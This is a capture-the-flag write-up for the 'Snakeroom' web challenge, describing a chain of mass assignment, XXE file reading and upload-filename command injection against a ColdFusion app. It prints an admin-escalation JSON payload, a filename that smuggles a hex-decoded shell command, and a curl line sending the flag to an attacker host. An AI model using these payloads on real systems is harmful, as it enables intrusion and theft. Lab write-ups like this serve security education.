# Snakeroom [_snakeCTF 2025 Finals_]

**Category**: Web
**Author**: macedonga

## Description

The challenge is a web application that allows users to post messages on a board. The application is written in ColdFusion and uses a MySQL database. The goal is to find the flag on the server.

## Solution

The solution to this challenge is divided into four main stages. First, reconnaissance by causing an error, then a mass assignment vulnerability is exploited to gain administrative privileges. Third, an XXE (XML External Entity) injection is used to exfiltrate the source code of the website. Finally we can find a logic flaw that allows for Remote Code Execution (RCE) via a file upload vulnerability.

### Stage 0: Reconnaissance
The initial step is to perform reconnaissance on the web application. The player can notice different commented html code, which will become useful in later stages. When visiting the main page, the application creates a session cookie named `SESSION_ID`. By sending a cookie longer than 64 characters, an error is triggered that reveals the full stack trace, making it possible to identify the technologies used in the backend, such as ColdFusion and MySQL. Also, the error message reveals a bit of the source code, which allows us to identify the `sessions` table in the database its columns, which include `is_admin`.

### Stage 1: Mass Assignment

The first step is to gain administrative privileges by using the unused "update display name" function in the board page. By intercepting the request to update the user's display name, it is possible to add the `is_admin` parameter to the request body. The backend, being vulnerable to mass assignment, processes this parameter and elevates the user's session to have administrative privileges.

The following payload is sent to `/board.cfm?b=b`:

```json
{
    "display_name": "pwned_by_mass_assignment",
    "is_admin": "1",
    "action": "setDisplayName"
}
```

After this request, the user has admin rights, which is confirmed by the presence of an "Admin" link on the main page.

### Stage 2: XXE Data Exfiltration

With administrative privileges, an unused "import board data" appears in the html code of the index page with the description "Upload an XML file to import board, thread, and post data". The html contains a form that sends data to  `/api/importer.cfm` endpoint, which is vulnerable to XXE injection. This vulnerability is used to read files from the server's filesystem. This allows the player to exfiltrate the website's source code.

### Stage 3: File Upload RCE

The final stage is to achieve RCE by exploiting a file upload vulnerability found in `/var/www/app/components/FileUpload.cfc`. The application allows users to upload an image when posting a message. The filename of the uploaded image is not sanitized, which allows for command injection.

A file is uploaded with a crafted filename containing a shell command. The command is designed to exfiltrate the flag to an attacker-controlled server. The filename is:

```
\'; echo {hex_rce} | xxd -r -p | sh; #.png
```

The `{hex_rce}` part is the hex-encoded version of the following shell command:

```sh
curl http://{attacker_host}:{flag_port}/?flag=$(echo $FLAG | base64)
```

This command reads the `FLAG` environment variable, base64-encodes it, and sends it to the attacker's listener. When the file is uploaded, the server-side script executes the command embedded in the filename, and the flag is captured.